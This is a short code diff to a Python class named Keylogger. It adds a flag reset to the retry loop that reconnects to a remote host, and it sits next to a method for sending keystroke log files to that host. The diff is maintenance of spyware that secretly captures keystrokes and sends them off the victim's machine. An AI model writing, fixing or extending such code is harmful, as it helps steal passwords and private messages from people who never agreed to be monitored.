@@ -107,6 +107,7 @@ class Keylogger:
                 self.connect_to_host()
                 self.connected = True
             except:
+                self.connected = False
                 time.sleep(5)
 
     def send_keylog_files_to_host(self):
